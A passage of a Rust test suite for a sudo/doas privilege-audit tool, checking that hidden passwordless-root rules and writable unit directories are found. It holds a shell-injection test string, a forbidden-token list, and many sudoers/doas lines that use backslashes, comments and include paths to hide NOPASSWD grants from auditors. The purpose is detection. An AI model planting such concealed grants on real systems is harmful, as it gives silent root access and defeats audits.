                findings: vec![
                    Finding::PasswordlessRule {
                        file: odd.to_path_buf(),
                        line: 1,
                        text: String::new(),
                        grant: Grant::Nopasswd,
                        applies_to_you: Applies::Yes,
                    },
                    // Out of place: ignored rather than misread.
                    Finding::RelativePathEntry {
                        entry: PathBuf::new(),
                    },
                ],
                unverified: Vec::new(),
                note: None,
            },
            Check {
                check: CheckId::UnitDirectories,
                status: Status::Found,
                examined: 1,
                findings: vec![
                    Finding::Writable {
                        path: odd.to_path_buf(),
                        at: odd.to_path_buf(),
                        via: Via::Itself,
                        writers: vec![Writer::Everyone],
                        shadows: None,
                    },
                    Finding::Writable {
                        path: injected.to_path_buf(),
                        at: injected.to_path_buf(),
                        via: Via::Itself,
                        writers: vec![Writer::Everyone],
                        shadows: None,
                    },
                ],
                unverified: Vec::new(),
                note: None,
            },
            Check {
                check: CheckId::RootPath,
                status: Status::Found,
                examined: 1,
                findings: vec![Finding::RelativePathEntry { entry: p(".") }],
                unverified: Vec::new(),
                note: None,
            },
        ],
    };
    let host = host.file("/usr/sbin/visudo", 0, 0, 0o755, b"");
    let proposals = propose(&host, &report, None);
    assert_eq!(
        ids(&proposals),
        vec!["review-sudoers-1", "protect-1", "protect-2"]
    );
    assert!(
        proposals
            .iter()
            .all(|p| p.commands.is_empty() && p.by_hand.is_some())
    );
}

#[test]
fn a_printable_argument_is_printable_ascii_and_nothing_else() {
    assert_eq!(
        proposals::printable("/etc/sudoers.d/90 cloud"),
        Some("/etc/sudoers.d/90 cloud")
    );
    assert_eq!(proposals::printable("~!$'\"`"), Some("~!$'\"`"));
    for hostile in [
        "a\x1bb",
        "tab\there",
        "del\x7f",
        "\u{e9}",
        "\u{202e}gpj.sh",
        "\u{430}ws",
        // fish ends a single-quoted word at `\'`, which sh does not.
        "a\\b",
        "/srv/a\\';echo INJECTED;\\'",
    ] {
        assert_eq!(proposals::printable(hostile), None, "{hostile:?}");
    }
}

#[test]
fn no_proposal_ever_grants_a_passwordless_path_or_skips_the_backend() {
    // `--fix` must never enable a confirmation the requesting process tree can
    // answer. Over a machine with every kind of finding, no proposal writes a
    // passwordless rule, joins a passwordless group, or runs a root command
    // without the backend in front of it, where the human types a password.
    let host = units_host()
        .file("/usr/bin/chmod", 0, 0, 0o755, b"")
        .file("/usr/bin/chown", 0, 0, 0o755, b"")
        .file("/usr/bin/gpasswd", 0, 0, 0o755, b"")
        .file("/usr/sbin/visudo", 0, 0, 0o755, b"")
        .file("/etc/sudoers", 0, 0, 0o440, b"yamin ALL=NOPASSWD: ALL\n")
        .file("/etc/doas.conf", 0, 0, 0o400, b"permit nopass yamin\n")
        .file(
            "/etc/group",
            0,
            0,
            0o644,
            b"adm:x:4:yamin\ndocker:x:999:yamin\naido:x:998:\nsudo:x:27:yamin\n",
        )
        .dir("/home/yamin/bin", ME, ME, 0o755);
    let report = run(&host, "/home/yamin/bin:.:/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    assert!(proposals.len() >= 8, "{:?}", ids(&proposals));
    let passwordless = ROOT_GROUPS
        .iter()
        .filter(|g| g.passwordless)
        .map(|g| g.name);
    for proposal in &proposals {
        assert_eq!(
            proposal.commands.is_empty(),
            proposal.by_hand.is_some(),
            "{proposal:?}"
        );
        for command in &proposal.commands {
            let text = command.join(" ");
            for forbidden in ["NOPASSWD", "nopass", "!authenticate", "persist"] {
                assert!(!text.contains(forbidden), "{text}");
            }
            assert_eq!(command[0], "/usr/bin/sudo", "{text}");
            if command.contains(&"--append".to_owned()) {
                for group in passwordless.clone() {
                    assert!(!command.contains(&group.to_owned()), "{text}");
                }
            }
        }
    }
}

// ---- The review of step 4b: sudo's lexer, read as sudo reads it. ----------
//
// Every `sudoers` input below was run through sudo 1.9.16p2 (`visudo -c`, then
// `sudo -n true` as the user): each one grants the user root without a
// password.

/// `(line, grant, applies)` of every passwordless rule in a check.
fn rules_in(report: &Report) -> Vec<(usize, Grant, Applies)> {
    check(report, CheckId::PasswordlessRules)
        .findings
        .iter()
        .filter_map(rule_of)
        .map(|(_, line, grant, applies)| (line, grant, applies))
        .collect()
}

fn sudoers(contents: &[u8]) -> MemoryHost {
    clean().file("/etc/sudoers", 0, 0, 0o440, contents)
}

/// The rule is reported as maybe the caller's and the check is not clean: what
/// every line ending in a backslash must come to. These cases were found
/// (`Applies::Yes`) while continuations were modelled; they are "maybe" now,
/// never clean and never "no". The status is `Found`, because a rule was found,
/// and not `Unverified`, which is what a check says when it found nothing; the
/// file is listed as unverified all the same, and that is what is asserted.
fn assert_maybe_never_clean(report: &Report, lines: &[usize], note: &str) {
    let rules = check(report, CheckId::PasswordlessRules);
    assert_eq!(rules.status, Status::Found, "{note}");
    assert!(
        rules
            .unverified
            .iter()
            .any(|gap| gap.reason.contains("end in a backslash")),
        "{note}"
    );
    let found = rules_in(report);
    assert_eq!(found.len(), lines.len(), "{note}: {found:?}");
    for ((line, _, applies), expected) in found.iter().zip(lines) {
        assert_eq!(line, expected, "{note}");
        assert_eq!(*applies, Applies::Maybe, "{note}");
    }
}

#[test]
fn denies_authenticate_off_hidden_by_blanks_after_the_continuation_backslash() {
    // sudo: `Defaults:yamin \<space>` then `\t!authenticate` is one line.
    let report = run(
        &sudoers(b"Defaults:yamin \\ \n\t!authenticate\n"),
        "/usr/bin",
    );
    assert_maybe_never_clean(&report, &[1], "Defaults:yamin continued");
}

#[test]
fn denies_global_authenticate_off_hidden_by_a_tab_after_the_backslash() {
    for text in [
        &b"Defaults \\\t\n  !authenticate\n"[..],
        b"Defaults \\ \r\n  !authenticate\r\n",
        b"Defaults\\\n!authenticate\n",
    ] {
        let report = run(&sudoers(text), "/usr/bin");
        assert_maybe_never_clean(&report, &[1], &format!("{text:?}"));
    }
}

#[test]
fn denies_a_blank_continuation_moving_the_tag_out_of_the_user_list() {
    // The tag on the next line must not become the "user list".
    let report = run(
        &sudoers(b"yamin ALL=(ALL) \\ \n    NOPASSWD: ALL\n"),
        "/usr/bin",
    );
    assert_maybe_never_clean(&report, &[1], "tag after a blank continuation");
}

#[test]
fn denies_a_midline_comment_swallowing_the_backslash_to_hide_a_rule_as_alices() {
    // sudo: the comment eats the backslash, so these are two rules, and the
    // second is yamin's. Joined, the report called it alice's.
    let report = run(
        &sudoers(b"alice ALL=(ALL) ALL # note \\\nyamin ALL=(ALL) NOPASSWD: ALL\n"),
        "/usr/bin",
    );
    // Never alice's, and no longer yamin's for certain either.
    assert_maybe_never_clean(&report, &[1], "midline comment then a backslash");
}

#[test]
fn authenticate_off_anywhere_else_is_reported_as_maybe_not_passed_over() {
    let report = run(
        &sudoers(
            b"yamin ALL = (ALL) NOPASSWD: !authenticate\n\
              yamin ALL = !authenticate /bin/true\n\
              Cmnd_Alias X = /bin/true, !authenticate\n",
        ),
        "/usr/bin",
    );
    assert_eq!(
        rules_in(&report),
        vec![
            (1, Grant::Nopasswd, Applies::Yes),
            (1, Grant::NoAuthenticate, Applies::Maybe),
            (2, Grant::NoAuthenticate, Applies::Maybe),
        ]
    );
}

#[test]
fn denies_a_backslash_escaped_space_in_an_include_path() {
    // sudo 1.9.1+: `@include /etc/sudoers\ local` reads `/etc/sudoers local`.
    let host = sudoers(b"@include /etc/sudoers\\ local\n").file(
        "/etc/sudoers local",
        0,
        0,
        0o440,
        b"yamin ALL=(ALL) NOPASSWD: ALL\n",
    );
    let report = run(&host, "/usr/bin");
    let rules = check(&report, CheckId::PasswordlessRules);
    assert_eq!(rules_in(&report), vec![(1, Grant::Nopasswd, Applies::Yes)]);
    assert_eq!(
        rule_of(&rules.findings[0]).map(|(file, ..)| file),
        Some("/etc/sudoers local".to_owned())
    );
}

#[test]
fn denies_a_hex_escaped_include_path_and_a_quoted_one() {
    let host = sudoers(b"#include /etc/a\\x20b\n#include \"/etc/c d\"\n#include /etc/e\\x2\n")
        .file("/etc/a b", 0, 0, 0o440, b"yamin ALL=(ALL) NOPASSWD: ALL\n")
        .file("/etc/c d", 0, 0, 0o440, b"alice ALL=(ALL) NOPASSWD: ALL\n")
        .file("/etc/ex2", 0, 0, 0o440, b"bob ALL=(ALL) NOPASSWD: ALL\n");
    let report = run(&host, "/usr/bin");
    assert_eq!(
        rules_in(&report),
        vec![
            (1, Grant::Nopasswd, Applies::Yes),
            (1, Grant::Nopasswd, Applies::No),
            (1, Grant::Nopasswd, Applies::Maybe),
        ]
    );
}

#[test]
fn an_include_naming_nothing_is_unverified_never_silently_clean() {
    let report = run(
        &sudoers(b"@include /etc/not-there\n@includedir /etc/not-there.d\n"),
        "/usr/bin",
    );
    let rules = check(&report, CheckId::PasswordlessRules);
    assert_eq!(rules.status, Status::Unverified);
    let at: Vec<&Path> = rules.unverified.iter().map(|u| u.path.as_path()).collect();
    assert_eq!(
        at,
        vec![Path::new("/etc/not-there.d"), Path::new("/etc/not-there")]
    );
    assert!(
        rules
            .unverified
            .iter()
            .all(|u| u.reason.contains("does not exist"))
    );
}

#[test]
fn doas_quotes_around_an_identity_do_not_hide_the_caller() {
    let host = clean().file(
        "/etc/doas.conf",
        0,
        0,
        0o400,
        b"permit nopass \"yamin\" as root\npermit nopass :\"adm\"\n",
    );
    let report = run(&host, "/usr/bin");
    assert_eq!(
        rules_in(&report),
        vec![
            (1, Grant::Nopass, Applies::Yes),
            (2, Grant::Nopass, Applies::Yes)
        ]
    );
}

#[test]
fn denies_a_hash_without_a_blank_swallowing_the_backslash_to_hide_the_callers_rule() {
    // sudo 1.9.16p2 (`visudo -c`, then `sudo -n true` as the caller): in each,
    // the `#` ends the line, the backslash is part of the comment, and the
    // caller's rule on the next line is its own. Joined, it vanished under an
    // alias or `Defaults` line (never read for a tag), or under alice's rule.
    for head in [
        &b"Cmnd_Alias X = /bin/true#c \\\n"[..],
        b"Defaults:alice lecture_file=/etc/x#c \\\n",
        b"alice ALL=(ALL) ALL#x \\\n",
        b"alice ALL=(ALL) /bin/true#x \\\n",
    ] {
        let mut text = head.to_vec();
        text.extend_from_slice(b"yamin ALL=(ALL) NOPASSWD: ALL\n");
        let report = run(&sudoers(&text), "/usr/bin");
        assert_maybe_never_clean(&report, &[1], &format!("{head:?}"));
    }
}

#[test]
fn denies_an_escaped_backslash_at_end_of_line_absorbing_the_callers_rule() {
    // sudo 1.9.16p2 and OpenDoas (cases L, M, N, P, R of the round-2 probe):
    // `\\` then the newline is a literal backslash and the caller's rule on
    // the next line is its own, passwordless. Joined, it was reported clean
    // (under a `Defaults` or alias line) or as alice's (under her rule).
    for head in [
        &b"Defaults:alice lecture_file=/etc/x\\\\\n"[..],
        b"Cmnd_Alias X = /bin/echo a\\\\\n",
        b"alice ALL=(ALL) /bin/echo a\\\\\n",
        b"Defaults:alice lecture_file=/etc/x\\\\ \n",
    ] {
        let mut text = head.to_vec();
        text.extend_from_slice(b"yamin ALL=(ALL) NOPASSWD: ALL\n");
        let report = run(&sudoers(&text), "/usr/bin");
        assert_maybe_never_clean(&report, &[1], &format!("{head:?}"));
    }
    let report = run(
        &clean().file(
            "/etc/doas.conf",
            0,
            0,
            0o400,
            b"permit alice cmd /bin/ls args a\\\\\npermit nopass yamin\n",
        ),
        "/usr/bin",
    );
    assert_maybe_never_clean(&report, &[1], "doas escaped backslash");
}

#[test]
fn denies_a_backslash_escaped_trailing_blank_absorbing_the_callers_rule() {
    // sudo 1.9.16p2 (T1-T7 of the round-3 probe, and the CRLF variant): a
    // backslash and blanks glued to a token do not continue the line, so the
    // caller's rule below is its own and passwordless. It must never be
    // Clean, and never credited to alice.
    for head in [
        &b"Defaults:alice lecture_file=/etc/x\\ \n"[..],
        b"Cmnd_Alias X = /bin/x\\ \n",
        b"alice ALL=(ALL) /bin/x\\ \n",
        b"Host_Alias H = foo\\ \n",
        b"Defaults:alice\\ \n",
        b"Defaults:alice lecture_file=/etc/x\\\t\n",
        b"Defaults:alice lecture_file=/etc/x\\\\\\ \n",
        b"alice ALL=(ALL) /bin/x\\ \r\n",
    ] {
        let mut text = head.to_vec();
        text.extend_from_slice(b"yamin ALL=(ALL) NOPASSWD: ALL\n");
        let report = run(&sudoers(&text), "/usr/bin");
        let rules = check(&report, CheckId::PasswordlessRules);
        assert_ne!(rules.status, Status::Clean, "{head:?}");
        assert!(
            rules
                .unverified
                .iter()
                .any(|gap| gap.reason.contains("line(s) 1")),
            "{head:?}"
        );
        assert!(
            rules_in(&report)
                .iter()
                .all(|(_, _, applies)| *applies != Applies::No),
            "{head:?}"
        );
    }
}

#[test]
fn denies_a_negative_hash_id_hiding_a_continuation_as_another_users_rule() {
    // sudo: `#-1` is an id, so the backslash continues and the next line is
    // part of yamin's rule. Read as a comment, it was alice's and bob's.
    let report = run(
        &sudoers(b"yamin ALL=(#-1,\\\nalice,bob ) NOPASSWD: ALL\n"),
        "/usr/bin",
    );
    assert_maybe_never_clean(&report, &[1], "negative hash id");
}

#[test]
fn an_unmodelled_construct_cannot_make_the_passwordless_check_clean() {
    // The safety net: a line whose reading depends on lexer behaviour aido
    // does not model (a quoted string with a backslash, `\q`, `\x41`) is
    // reported unverified, and a rule it may have joined is "maybe" -- never
    // Clean, and never a rule credited to someone else.
    for head in [
        &b"Defaults:alice lecture_file=\"/etc/x\\\\\"\n"[..],
        b"Defaults:alice lecture_file=/etc/x\\q\n",
        b"Cmnd_Alias X = /bin/echo \\x41 \\\n",
    ] {
        let report = run(&sudoers(head), "/usr/bin");
        let rules = check(&report, CheckId::PasswordlessRules);
        assert_eq!(rules.status, Status::Unverified, "{head:?}");
        assert!(
            rules
                .unverified
                .iter()
                .any(|gap| gap.reason.contains("line(s) 1")),
            "{head:?}"
        );
        let mut text = head.to_vec();
        text.extend_from_slice(b"yamin ALL=(ALL) NOPASSWD: ALL\n");
        let report = run(&sudoers(&text), "/usr/bin");
        let rules = check(&report, CheckId::PasswordlessRules);
        assert_ne!(rules.status, Status::Clean, "{head:?}");
        assert!(
            rules_in(&report)
                .iter()
                .all(|(_, _, applies)| *applies != Applies::No),
            "{head:?}"
        );
    }
    let report = run(
        &clean().file(
            "/etc/doas.conf",
            0,
            0,
            0o400,
            b"permit alice cmd \"a\\\\b\" \\\npermit nopass yamin\n",
        ),
        "/usr/bin",
    );
    assert_eq!(rules_in(&report), vec![(1, Grant::Nopass, Applies::Maybe)]);
}

#[test]
fn denies_a_doas_escaped_blank_or_midword_hash_hiding_the_callers_rule() {
    // OpenDoas (`doas -C`, then `doas -n true` as the caller): a backslash
    // and a blank escape the blank and the rule ends; `#` ends it mid-word.
    // Neither continues onto `permit nopass yamin`.
    for head in [
        &b"permit alice cmd /bin/ls args \\ \n"[..],
        b"permit alice cmd /bin/ls#x \\\n",
    ] {
        let mut text = head.to_vec();
        text.extend_from_slice(b"permit nopass yamin\n");
        let report = run(
            &clean().file("/etc/doas.conf", 0, 0, 0o400, &text),
            "/usr/bin",
        );
        assert_maybe_never_clean(&report, &[1], &format!("{head:?}"));
    }
}

#[test]
fn denies_a_trailing_backslash_in_an_include_path_absorbing_the_callers_rule() {
    // Round 4: `@include /etc/sudoers.d/extra\` and the caller's rule on the
    // next line. The target exists and is read, and the rule is reported as
    // "maybe" the caller's: never lost, never clean.
    for directive in [
        &b"@include /etc/sudoers.d/extra"[..],
        b"#include /etc/sudoers.d/extra",
        b"@includedir /etc/sudoers.d",
        b"#includedir /etc/sudoers.d",
    ] {
        let mut text = directive.to_vec();
        text.extend_from_slice(b"\\\nyamin ALL=(ALL) NOPASSWD: ALL\n");
        let host = sudoers(&text).dir("/etc/sudoers.d", 0, 0, 0o755).file(
            "/etc/sudoers.d/extra",
            0,
            0,
            0o440,
            b"alice ALL=(ALL) ALL\n",
        );
        let report = run(&host, "/usr/bin");
        // The include marker, then the rule its path may have absorbed.
        assert_maybe_never_clean(&report, &[1, 1], &format!("{directive:?}"));
    }
}

/// Every spelling of an include directive, and whether it names a directory.
const INCLUDE_DIRECTIVES: [(&str, bool); 4] = [
    ("@include", false),
    ("#include", false),
    ("@includedir", true),
    ("#includedir", true),
];

const ALICES_GRANT: &[u8] = b"alice ALL=(ALL) NOPASSWD: ALL\n";
const THE_CALLERS_GRANT: &[u8] = b"yamin ALL=(ALL) NOPASSWD: ALL\n";

/// A machine whose sudoers is `text`, and that has two things an include of
/// `/etc/s2/a\` may name: `/etc/s2/a`, which holds another user's grant, and
/// `/etc/s2/a\`, a name that ends in a backslash, which holds the caller's. For
/// an include of a directory each is a directory with one file in it. Returns
/// the host, then the file with the other user's grant, then the file with the
/// caller's.
fn host_with_both_names(text: &[u8], is_dir: bool) -> (MemoryHost, String, String) {
    let (plain, kept) = ("/etc/s2/a", "/etc/s2/a\\");
    let host = sudoers(text).dir("/etc/s2", 0, 0, 0o755);
    if is_dir {
        let (plain_file, kept_file) = (format!("{plain}/ok"), format!("{kept}/grant"));
        let host = host
            .dir(plain, 0, 0, 0o755)
            .file(&plain_file, 0, 0, 0o440, ALICES_GRANT)
            .dir(kept, 0, 0, 0o755)
            .file(&kept_file, 0, 0, 0o440, THE_CALLERS_GRANT);
        (host, plain_file, kept_file)
    } else {
        let host =
            host.file(plain, 0, 0, 0o440, ALICES_GRANT)
                .file(kept, 0, 0, 0o440, THE_CALLERS_GRANT);
        (host, plain.to_owned(), kept.to_owned())
    }
}

/// `(file, line, grant, applies)` of every passwordless rule in a report.
fn rules_with_files(report: &Report) -> Vec<(String, usize, Grant, Applies)> {
    check(report, CheckId::PasswordlessRules)
        .findings
        .iter()
        .filter_map(rule_of)
        .collect()
}

/// The caller's grant in `kept` is reported as theirs, and so the report is
/// not only another user's rule; the file with the other user's rule is read
/// too, and the file says which lines it could not model.
fn assert_the_callers_grant_is_found(report: &Report, plain: &str, kept: &str, note: &str) {
    let rules = check(report, CheckId::PasswordlessRules);
    let found = rules_with_files(report);
    assert_eq!(rules.status, Status::Found, "{note}");
    assert!(
        found.contains(&(kept.to_owned(), 1, Grant::Nopasswd, Applies::Yes)),
        "{note}: {found:?}"
    );
    assert!(
        found.contains(&(plain.to_owned(), 1, Grant::Nopasswd, Applies::No)),
        "{note}: {found:?}"
    );
    assert!(
        found
            .iter()
            .any(|(_, _, _, applies)| *applies != Applies::No),
        "{note}: only others' rules: {found:?}"
    );
    assert!(
        rules
            .unverified
            .iter()
            .any(|gap| gap.reason.contains("end in a backslash")),
        "{note}"
    );
}

#[test]
fn denies_an_include_path_ending_in_a_backslash_crediting_the_callers_grant_to_the_plain_named_file()
 {
    // sudo 1.9.16p2 (`sudo -n true` as the caller): an include path is the one
    // token that keeps a final backslash, so `@include /etc/s2/a\` opens the
    // file named `a\`, where the caller's grant is, and never `a`, which holds
    // another user's. Reading only `a`, the report found that user's rule and
    // not the caller's: the caller had passwordless root and the report named
    // someone else. It is the same for `#include`, and for a directory with
    // `@includedir` and `#includedir`.
    for (directive, is_dir) in INCLUDE_DIRECTIVES {
        for after in [&b""[..], b"alice ALL=(ALL) ALL\n"] {
            let mut text = format!("{directive} /etc/s2/a\\\n").into_bytes();
            text.extend_from_slice(after);
            let (host, plain, kept) = host_with_both_names(&text, is_dir);
            let report = run(&host, "/usr/bin");
            let note = format!("{directive} {after:?}");
            assert_the_callers_grant_is_found(&report, &plain, &kept, &note);
        }
    }
}

#[test]
fn denies_an_include_path_ending_in_a_backslash_on_a_later_line_crediting_the_callers_grant_to_the_plain_named_file()
 {
    // sudo 1.9.16p2: after `lecture_file=/etc/x\ ` (an escaped blank) or a
    // comment that eats its backslash the next line is a directive of its own,
    // and its path keeps the final backslash too. The report read the plain
    // name of an include on such a line, and the caller's grant, in the name
    // with the backslash, went unseen.
    for head in [
        &b"Defaults:alice lecture_file=/etc/x\\ \n"[..],
        b"alice ALL=(ALL) ALL # note \\\n",
    ] {
        for (directive, is_dir) in INCLUDE_DIRECTIVES {
            let mut text = head.to_vec();
            text.extend_from_slice(format!("{directive} /etc/s2/a\\\n").as_bytes());
            let (host, plain, kept) = host_with_both_names(&text, is_dir);
            let report = run(&host, "/usr/bin");
            let note = format!("{head:?} {directive}");
            assert_the_callers_grant_is_found(&report, &plain, &kept, &note);
        }
    }
}

/// A machine for the include shapes of observer round 2. The file or
/// directory sudo opens (`/etc/s4/ab`, `/etc/s5d`, `/etc/s6/a\`, `/etc/s7\`,
/// `/etc/s9`, `/etc/s9d`) holds the caller's grant; every plain name a reader
/// following candidates may reach holds another user's.
fn host_for_unreadable_includes(text: &[u8]) -> MemoryHost {
    let mut host = sudoers(text);
    for dir in [
        "/etc/s4",
        "/etc/s5",
        "/etc/s5d",
        "/etc/s6",
        "/etc/s7",
        "/etc/s7\\",
        "/etc/s9d",
    ] {
        host = host.dir(dir, 0, 0, 0o755);
    }
    for (file, grant) in [
        ("/etc/s4/a", ALICES_GRANT),
        ("/etc/s4/a\\", ALICES_GRANT),
        ("/etc/s4/ab", THE_CALLERS_GRANT),
        ("/etc/s5/g", ALICES_GRANT),
        ("/etc/s5d/g", THE_CALLERS_GRANT),
        ("/etc/s6/a", ALICES_GRANT),
        ("/etc/s6/a\\", THE_CALLERS_GRANT),
        ("/etc/s7/g", ALICES_GRANT),
        ("/etc/s7\\/g", THE_CALLERS_GRANT),
        ("/etc/s9", THE_CALLERS_GRANT),
        ("/etc/s9d/g", THE_CALLERS_GRANT),
    ] {
        host = host.file(file, 0, 0, 0o440, grant);
    }
    host
}

/// The caller holds passwordless root through a file the report cannot name,
/// and the report must not read as if it had looked: it is `Found`, some
/// finding is not "names others", and the include is reported, as one aido
/// could not check, on `line`. What the report finds in the plain-named
/// candidates differs by shape, so it is not pinned here.
fn assert_the_callers_grant_is_not_hidden(report: &Report, line: usize, note: &str) {
    assert_eq!(
        check(report, CheckId::PasswordlessRules).status,
        Status::Found,
        "{note}"
    );
    let found = rules_with_files(report);
    assert!(
        found
            .iter()
            .any(|(_, _, _, applies)| *applies != Applies::No),
        "{note}: only others' rules: {found:?}"
    );
    assert!(
        found.contains(&(
            "/etc/sudoers".to_owned(),
            line,
            Grant::Include,
            Applies::Maybe
        )),
        "{note}: {found:?}"
    );
}

#[test]
fn denies_an_include_sudo_reads_from_a_file_aido_did_not_open_hiding_the_callers_grant() {
    // Observer round 2, each input run through sudo 1.9.16p2 (`sudo -n true`
    // as the caller), which opens the file the caller's grant is in: a
    // backslash-newline inside the quotes of an include path is dropped (q), and
    // an include path may start on the continuation line of its directive (n).
    // Neither file is one a candidate names, and the plain-named candidates
    // hold another user's grant. The report said so, and said nothing else.
    for (text, line) in [
        (&b"@include \\\n/etc/s6/a\\\n"[..], 1), // n1_inc_path_on_next_line.sudoers
        (&b"#include \\\n/etc/s6/a\\\n"[..], 1), // n2_hashinc_path_on_next_line.sudoers
        (&b"@includedir \\\n/etc/s7\\\n"[..], 1), // n3_incdir_path_on_next_line.sudoers
        (&b"@include \\\n   /etc/s6/a\\\n"[..], 1), // n4_inc_path_on_next_line_lead.sudoers
        (&b"#includedir \\\n/etc/s7\\\n"[..], 1), // n5_hashincdir_path_on_next_line.sudoers
        (&b"@include \"/etc/s4/a\\\nb\"\n"[..], 1), // q1_inc_quoted_cont.sudoers
        (&b"@include \"/etc/s4/a\\\n   b\"\n"[..], 1), // q2_inc_quoted_cont_lead.sudoers
        (&b"#include \"/etc/s4/a\\\nb\"\n"[..], 1), // q3_hashinc_quoted_cont.sudoers
        (&b"@includedir \"/etc/s5\\\nd\"\n"[..], 1), // q4_incdir_quoted_cont.sudoers
        (&b"#includedir \"/etc/s5\\\nd\"\n"[..], 1), // q5_hashincdir_quoted_cont.sudoers
        (&b"@include \"/etc/s4/a\\ \nb\"\n"[..], 1), // q6_inc_quoted_cont_blank.sudoers
        (&b"@include \"/etc/s4/a\\\r\nb\"\r\n"[..], 1), // q7_inc_quoted_cont_crlf.sudoers
        (
            &b"Defaults:alice lecture_file=/etc/x\\ \n@include \"/etc/s4/a\\\nb\"\n"[..],
            2,
        ), // q8_later_inc_quoted_cont.sudoers
    ] {
        let report = run(&host_for_unreadable_includes(text), "/usr/bin");
        assert_the_callers_grant_is_not_hidden(&report, line, &format!("{text:?}"));
    }
}

#[test]
fn denies_a_carriage_return_ending_a_later_include_line_hiding_the_callers_grant() {
    // A CRLF file, the include on a later line that is its own directive:
    // sudo opens `/etc/s6/a\`, the path with its backslash and without the
    // carriage return; a candidate that kept the `\r` would name a file
    // that does not exist, and the caller's grant would go unseen.
    let text = b"alice ALL=(ALL) ALL # note \\\r\n@include /etc/s6/a\\\r\n";
    let report = run(&host_for_unreadable_includes(text), "/usr/bin");
    let found = rules_with_files(&report);
    assert!(
        found.contains(&("/etc/s6/a\\".to_owned(), 1, Grant::Nopasswd, Applies::Yes)),
        "{found:?}"
    );
    assert_the_callers_grant_is_not_hidden(&report, 2, "crlf");
}

#[test]
fn denies_an_include_in_any_shape_after_any_line_ending_in_a_backslash_hiding_the_callers_grant() {
    // The property: after every generated head, every directive in every shape
    // (quoted and continued, path on the next line, directive split by the
    // join, plain) leaves the caller's grant, in a file no plain name reaches
    // for the first two shapes, reported and never read as clean or as
    // someone else's.
    let heads = config::lines_ending_in_a_backslash();
    for head in &heads {
        for (directive, is_dir) in INCLUDE_DIRECTIVES {
            let (quoted, next, plain) = if is_dir {
                (
                    format!("{directive} \"/etc/s5\\\nd\"\n"),
                    format!("{directive}\\\n/etc/s7\\\n"),
                    format!("{directive} /etc/s9d\n"),
                )
            } else {
                (
                    format!("{directive} \"/etc/s4/a\\\nb\"\n"),
                    format!("{directive}\\\n/etc/s6/a\\\n"),
                    format!("{directive} /etc/s9\n"),
                )
            };
            for shape in [&quoted, &next, &plain] {
                let mut text = head.clone();
                text.extend_from_slice(shape.as_bytes());
                let report = run(&host_for_unreadable_includes(&text), "/usr/bin");
                let note = format!("{head:?} {shape:?}");
                assert_eq!(
                    check(&report, CheckId::PasswordlessRules).status,
                    Status::Found,
                    "{note}"
                );
                assert!(
                    rules_in(&report)
                        .iter()
                        .any(|(_, _, applies)| *applies != Applies::No),
                    "{note}"
                );
            }
        }
        // The directive split by a join.
        let mut text = head.clone();
        text.extend_from_slice(b"@incl\\\nude /etc/s9\n");
        let report = run(&host_for_unreadable_includes(&text), "/usr/bin");
        assert!(
            rules_in(&report)
                .iter()
                .any(|(_, grant, applies)| *grant == Grant::Include && *applies == Applies::Maybe),
            "{head:?}"
        );
    }
}

#[test]
fn denies_an_include_path_ended_by_a_blank_before_the_backslash_hiding_the_callers_grant() {
    // sudo 1.9.16p2 (`sudo -n true` as the caller): after a blank the
    // backslash is a continuation, and the include of `a` is honoured, though
    // the line that follows it is then a syntax error. The path with the
    // backslash cut off is read, and where the caller's grant is in `a` the
    // report finds it, whether or not `a\` exists too.
    let host = sudoers(b"@include /etc/s2/a \\\nalice ALL=(ALL) ALL\n")
        .dir("/etc/s2", 0, 0, 0o755)
        .file("/etc/s2/a", 0, 0, 0o440, THE_CALLERS_GRANT)
        .file("/etc/s2/a\\", 0, 0, 0o440, ALICES_GRANT);
    let report = run(&host, "/usr/bin");
    let found = rules_with_files(&report);
    assert!(
        found.contains(&("/etc/s2/a".to_owned(), 1, Grant::Nopasswd, Applies::Yes)),
        "{found:?}"
    );
}

#[test]
fn denies_an_include_of_a_name_with_an_escaped_blank_after_the_backslash_hiding_the_callers_grant()
{
    // sudo 1.9.16p2: `@include /etc/s2/a\ ` (a backslash, then a blank) opens
    // the file `a ` with the blank in its name, as the escaped blank it is.
    let host = sudoers(b"@include /etc/s2/a\\ \n")
        .dir("/etc/s2", 0, 0, 0o755)
        .file("/etc/s2/a", 0, 0, 0o440, ALICES_GRANT)
        .file("/etc/s2/a ", 0, 0, 0o440, THE_CALLERS_GRANT);
    let report = run(&host, "/usr/bin");
    let found = rules_with_files(&report);
    assert!(
        found.contains(&("/etc/s2/a ".to_owned(), 1, Grant::Nopasswd, Applies::Yes)),
        "{found:?}"
    );
    assert!(
        found.contains(&("/etc/s2/a".to_owned(), 1, Grant::Nopasswd, Applies::No)),
        "{found:?}"
    );
}

#[test]
fn denies_an_include_on_a_line_the_program_did_not_join_hiding_the_callers_grant() {
    // sudo 1.9.16p2 (`sudo -n true` as the caller): `lecture_file=/etc/x\ `
    // ends in an escaped blank and `# note \` in a comment that eats its
    // backslash, so the include on the next line is a directive of its own, and
    // the file it names grants the caller. Joined to the line above, it was
    // never read: the report must find the grant there, and say that line 1 is
    // unverified.
    for head in [
        &b"Defaults:alice lecture_file=/etc/x\\ \n"[..],
        b"alice ALL=(ALL) ALL # note \\\n",
    ] {
        for directive in [
            &b"@include /etc/sudo-extra\n"[..],
            b"#include /etc/sudo-extra\n",
            b"@includedir /etc/sudo-extra.d\n",
            b"#includedir /etc/sudo-extra.d\n",
        ] {
            let mut text = head.to_vec();
            text.extend_from_slice(directive);
            let host = sudoers(&text)
                .file(
                    "/etc/sudo-extra",
                    0,
                    0,
                    0o440,
                    b"yamin ALL=(ALL) NOPASSWD: ALL\n",
                )
                .dir("/etc/sudo-extra.d", 0, 0, 0o755)
                .file(
                    "/etc/sudo-extra.d/grant",
                    0,
                    0,
                    0o440,
                    b"yamin ALL=(ALL) NOPASSWD: ALL\n",
                );
            let report = run(&host, "/usr/bin");
            let rules = check(&report, CheckId::PasswordlessRules);
            let note = format!("{head:?} {directive:?}");
            assert_eq!(rules.status, Status::Found, "{note}");
            // The include is on line 2 and marked; the grant is in the file it
            // names, which is read.
            let mut found = rules_in(&report);
            found.sort_by_key(|(line, _, _)| *line);
            assert_eq!(
                found,
                vec![
                    (1, Grant::Nopasswd, Applies::Yes),
                    (2, Grant::Include, Applies::Maybe)
                ],
                "{note}"
            );
            assert!(
                rules
                    .unverified
                    .iter()
                    .any(|gap| gap.reason.contains("end in a backslash")),
                "{note}"
            );
        }
    }
}

#[test]
fn denies_a_continuation_splitting_a_doas_identity_as_another_users() {
